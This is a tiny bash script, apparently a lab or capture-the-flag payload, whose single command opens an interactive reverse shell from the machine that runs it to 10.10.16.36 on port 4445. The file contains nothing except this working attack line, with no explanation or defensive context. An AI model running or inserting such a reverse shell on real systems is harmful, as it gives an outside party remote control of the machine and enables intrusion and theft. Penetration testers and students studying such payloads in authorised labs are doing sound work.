#!/bin/bash

bash -i >& /dev/tcp/10.10.16.36/4445 0>&1
